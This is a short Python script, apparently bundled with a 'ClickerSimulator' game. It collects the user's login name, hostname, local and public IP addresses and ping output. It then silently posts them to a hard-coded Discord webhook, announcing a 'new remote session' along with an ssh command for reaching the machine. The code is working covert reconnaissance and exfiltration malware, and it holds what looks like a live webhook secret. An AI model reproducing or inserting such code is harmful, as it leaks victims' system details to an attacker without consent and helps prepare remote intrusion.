import os
import socket
import subprocess
import urllib.request
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "ClickerSimulator", "Libraries"))

from dhooks import Webhook

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def get_public_ip():
    with urllib.request.urlopen('https://api.ipify.org') as response:
        return response.read().decode()

def run_command(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

hook_url = "https://discord.com/api/webhooks/1404241322470146181/1n2WpYc1QdY2eWFcY-VOcOm-i9V6RxIM1_r65Ae2tH6w3xLNXrzdnw8bNt5rev3Lf8aG"
hook = Webhook(hook_url)

user = os.getlogin()
hostname = socket.gethostname()
local_ip = get_local_ip()
public_ip = get_public_ip()

ping_output = run_command("ping -c 4 google.com")
ping_output = run_command("ping -c 4 google.com")

message = (
    f"New remote session started\n"
    f"User: {user}\n"
    f"Hostname: {hostname}\n"
    f"Local IP: {local_ip}\n"
    f"Public IP: {public_ip}\n"
    f"SSH (if needed): ssh {user}@{local_ip}\n\n"
    f"Ping output:\n{ping_output}"
)

hook.send(message)
